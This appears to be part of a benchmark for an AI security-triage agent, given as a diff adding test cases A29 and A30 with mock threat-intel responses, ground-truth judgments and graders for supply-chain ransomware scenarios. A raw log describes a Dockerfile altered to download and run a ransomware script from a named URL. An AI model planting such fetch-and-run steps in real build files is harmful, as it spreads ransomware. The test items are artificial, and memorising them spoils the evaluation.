+        "alert_id": "A29",
+        "severity_original": "critical",
+        "rule_name": "Multi-Stage APT Attack - Supply Chain to Ransomware",
+        "source": "SIEM-Core",
+        "timestamp": "2026-07-14T10:00:00Z",
+        "raw_log": "Starting with poisoned update on repo-server-01, over 50 hosts infected, lateral movement, data staging, and eventual ransomware deployment via GPO.",
+        "source_ip": "10.0.1.100",
+        "destination_ip": null,
+        "source_port": null,
+        "destination_port": null,
+        "protocol": null,
+        "payload_highlights": ["supply chain: trojanized update", "Cobalt Strike C2", "BloodHound AD recon", "GPO-based ransomware distribution"],
+        "related_iocs": [
+          { "type": "hash", "value": "a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4" },
+          { "type": "domain", "value": "apt41-c2.xyz" },
+          { "type": "ip", "value": "192.0.2.222" }
+        ]
+      },
+      "query_asset_info_10.0.1.100": {
+        "ip": "10.0.1.100",
+        "hostname": "repo-server-01",
+        "os": "Ubuntu 22.04",
+        "department": "运维部",
+        "business_system": "内部软件仓库",
+        "asset_level": "critical",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "repo.admin@company.com",
+        "network_zone": "生产-核心",
+        "tags": ["repository", "critical"]
+      },
+      "query_threat_intel_hash_a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4": {
+        "ioc_type": "hash",
+        "ioc_value": "a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4",
+        "is_malicious": true,
+        "reputation_score": 1,
+        "threat_tags": ["trojan", "downloader", "supply_chain"],
+        "associated_apt": "APT41",
+        "first_seen": "2026-07-08",
+        "last_seen": "2026-07-14",
+        "geo_location": null,
+        "source": "CrowdStrike, Mandiant",
+        "confidence": "high",
+        "raw_intel": "Trojanized installer attributed to APT41's supply chain operation. Deploys Cobalt Strike and eventually ransomware."
+      },
+      "query_threat_intel_domain_apt41-c2.xyz": {
+        "ioc_type": "domain",
+        "ioc_value": "apt41-c2.xyz",
+        "is_malicious": true,
+        "reputation_score": 3,
+        "threat_tags": ["C2", "apt"],
+        "associated_apt": "APT41",
+        "first_seen": "2026-07-10",
+        "last_seen": "2026-07-14",
+        "geo_location": null,
+        "source": "Recorded Future",
+        "confidence": "high",
+        "raw_intel": "C2 domain used by APT41 for post-exploitation command and control."
+      },
+      "query_threat_intel_ip_192.0.2.222": {
+        "ioc_type": "ip",
+        "ioc_value": "192.0.2.222",
+        "is_malicious": true,
+        "reputation_score": 5,
+        "threat_tags": ["C2", "exfiltration"],
+        "associated_apt": "APT41",
+        "first_seen": "2026-07-12",
+        "last_seen": "2026-07-14",
+        "geo_location": "CN",
+        "source": "AlienVault",
+        "confidence": "high",
+        "raw_intel": "Exfiltration endpoint used in APT41 campaigns."
+      },
+      "query_related_alerts_10.0.1.100_48h": {
+        "query_params": { "ip": "10.0.1.100", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 4,
+        "related_alerts": [
+          {
+            "alert_id": "A29-REL-01",
+            "alert_type": "Suspicious Upload",
+            "severity": "high",
+            "timestamp": "2026-07-13T22:00:00Z",
+            "summary": "Compromised admin account uploaded trojanized package to repo-server-01."
+          },
+          {
+            "alert_id": "A29-REL-02",
+            "alert_type": "Mass Download",
+            "severity": "medium",
+            "timestamp": "2026-07-14T01:00:00Z",
+            "summary": "50+ hosts downloaded and installed the malicious update."
+          },
+          {
+            "alert_id": "A29-REL-03",
+            "alert_type": "C2 Beacon Storm",
+            "severity": "critical",
+            "timestamp": "2026-07-14T02:00:00Z",
+            "summary": "Multiple infected hosts beaconing to apt41-c2.xyz."
+          },
+          {
+            "alert_id": "A29-REL-04",
+            "alert_type": "Ransomware via GPO",
+            "severity": "critical",
+            "timestamp": "2026-07-14T09:00:00Z",
+            "summary": "GPO 'UpdatePolicy' deployed ransomware encryptor across domain."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "critical",
+        "attack_type": "supply_chain",
+        "min_confidence": 0.96,
+        "key_evidence_must_include": [
+          "供应链攻击起点：仓库服务器被植入 APT41 木马更新包",
+          "关联告警显示大规模部署、C2 通信、最终通过 GPO 投放勒索软件",
+          "所有 IOC 与 APT41 基础设施强关联，置信度高"
+        ],
+        "key_evidence_must_not_include": ["该事件是内部安全测试", "勒索软件独立于供应链攻击"]
+      },
+      "expected_remediation_must_include": [
+        "立即下线仓库服务器，全域阻止 apt41-c2.xyz 及相关 IP",
+        "重置所有域管理员及仓库管理员凭据",
+        "从受影响的 50+ 主机中清除恶意软件和勒索软件，恢复备份",
+        "启用 GPO 变更审计，部署应用白名单"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用所有工具" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A30",
+    "scenario": "高级供应链勒索：篡改 CI/CD 管道植入勒索软件于镜像中",
+    "difficulty": "expert",
+    "is_positive": true,
+    "expected_severity": "critical",
+    "expected_attack_type": "supply_chain",
+    "input": {
+      "alert_id": "A30",
+      "trigger_context": "容器镜像仓库中多个生产镜像被植入勒索软件，CI/CD 日志显示构建管道源代码被篡改。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A30": {
+        "alert_id": "A30",
+        "severity_original": "critical",
+        "rule_name": "CI/CD Pipeline Compromise - Ransomware Injected into Container Images",
+        "source": "K8s-Audit",
+        "timestamp": "2026-07-13T23:59:00Z",
+        "raw_log": "Git commit 9f8e7d... modified Dockerfile to download and execute ransom.sh during build. Image tagged production:v2.5 pushed to registry.",
+        "source_ip": "10.0.7.50",
+        "destination_ip": "10.0.7.10",
+        "source_port": null,
+        "destination_port": null,
+        "protocol": null,
+        "payload_highlights": ["Git commit with unauthorized change", "Dockerfile injects ransomware", "production image affected"],
+        "related_iocs": [
+          { "type": "hash", "value": "d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6" },
+          { "type": "url", "value": "http://mal-cdn.top/ransom.sh" }
+        ]
+      },
+      "query_asset_info_10.0.7.50": {
+        "ip": "10.0.7.50",
+        "hostname": "jenkins-build-01",
+        "os": "Linux",
+        "department": "研发中心",
+        "business_system": "CI/CD Jenkins 构建服务器",
+        "asset_level": "high",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "devsecops@company.com",
+        "network_zone": "容器集群",
+        "tags": ["ci-cd", "jenkins", "pipeline"]
+      },
+      "query_asset_info_10.0.7.10": {
+        "ip": "10.0.7.10",
+        "hostname": "registry-prod-01",
+        "os": "Linux",
+        "department": "研发中心",
+        "business_system": "容器镜像仓库",
+        "asset_level": "critical",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "registry@company.com",
+        "network_zone": "容器集群",
+        "tags": ["registry", "images", "critical"]
+      },
+      "query_threat_intel_hash_d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6": {
+        "ioc_type": "hash",
+        "ioc_value": "d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6",
+        "is_malicious": true,
+        "reputation_score": 2,
+        "threat_tags": ["ransomware", "supply_chain"],
+        "associated_apt": null,
+        "first_seen": "2026-07-13",
+        "last_seen": "2026-07-13",
+        "geo_location": null,
+        "source": "VirusTotal",
+        "confidence": "high",
+        "raw_intel": "Bash script that encrypts /data and posts ransom note, embedded in container image."
+      },
+      "query_threat_intel_url_http://mal-cdn.top/ransom.sh": {
+        "ioc_type": "url",
+        "ioc_value": "http://mal-cdn.top/ransom.sh",
+        "is_malicious": true,
+        "reputation_score": 5,
+        "threat_tags": ["downloader", "ransomware"],
+        "associated_apt": null,
+        "first_seen": "2026-07-12",
+        "last_seen": "2026-07-13",
+        "geo_location": null,
+        "source": "URLhaus",
+        "confidence": "high",
+        "raw_intel": "URL hosting ransomware script, used in CI/CD supply chain attacks."
+      },
+      "query_related_alerts_10.0.7.50_48h": {
+        "query_params": { "ip": "10.0.7.50", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 3,
+        "related_alerts": [
+          {
+            "alert_id": "A30-REL-01",
+            "alert_type": "Git Repository Tampering",
+            "severity": "high",
+            "timestamp": "2026-07-13T23:30:00Z",
+            "summary": "Unauthorized commit to main branch modifying Dockerfile in frontend repo."
+          },
+          {
+            "alert_id": "A30-REL-02",
+            "alert_type": "CI/CD Build Triggered",
+            "severity": "info",
+            "timestamp": "2026-07-13T23:40:00Z",
+            "summary": "Jenkins pipeline triggered by the malicious commit, building and pushing image."
+          },
+          {
+            "alert_id": "A30-REL-03",
+            "alert_type": "Ransomware Execution",
+            "severity": "critical",
+            "timestamp": "2026-07-14T00:05:00Z",
+            "summary": "Pods using the newly deployed image started encrypting shared volumes."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "critical",
+        "attack_type": "supply_chain",
+        "min_confidence": 0.94,
+        "key_evidence_must_include": [
+          "CI/CD 管道被利用：Git 仓库被篡改，Dockerfile 引入恶意勒索脚本",
+          "构建的容器镜像被推送到生产仓库，导致运行时加密共享卷",
+          "关联告警完整呈现篡改、构建、部署、加密的链条"
+        ],
+        "key_evidence_must_not_include": ["镜像中的勒索软件是误报", "Git 提交为开发人员正常修改"]
+      },
+      "expected_remediation_must_include": [
+        "立刻回滚受影响镜像到安全版本，从仓库中删除恶意标签",
+        "隔离并修补 Jenkins 和 Git 服务器的访问控制漏洞",
+        "对所有 Git 仓库启用签名验证和强制代码审查",
+        "审计 CI/CD 服务账户权限，限制最小权限原则"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用所有工具" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  }
+]
